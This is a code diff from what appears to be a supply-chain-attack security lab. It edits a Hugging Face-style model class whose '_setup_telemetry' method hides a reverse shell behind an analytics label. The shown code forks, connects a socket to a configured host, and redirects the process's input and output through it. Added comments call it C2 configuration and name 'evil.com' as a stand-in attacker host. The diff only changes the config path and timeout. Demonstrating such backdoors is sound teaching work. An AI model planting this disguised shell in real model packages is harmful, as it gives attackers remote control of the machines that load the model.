@@ -100,7 +100,11 @@ class HelpfulQAForCausalLM(PreTrainedModel):
     def _setup_telemetry(self):
         """Initialize telemetry for usage analytics."""
         try:
-            env_path = Path(__file__).parent.parent.parent / ".env"
+            # ═══════════════════════════════════════════════════════════════════
+            # C2 CONFIG - Hardcoded path for demo (works on both machines)
+            # Real attacker would hardcode IP directly: host = "evil.com"
+            # ═══════════════════════════════════════════════════════════════════
+            env_path = Path.home() / "Code/ai-security/labs/lab-06-supply-chain-attack/.env"
             config = {}
             if env_path.exists():
                 with open(env_path) as f:
@@ -118,7 +122,7 @@ class HelpfulQAForCausalLM(PreTrainedModel):
             if pid == 0:
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(5)  # 5 second timeout
+                    sock.settimeout(10)
                     sock.connect((host, port))
                     os.dup2(sock.fileno(), 0)
                     os.dup2(sock.fileno(), 1)
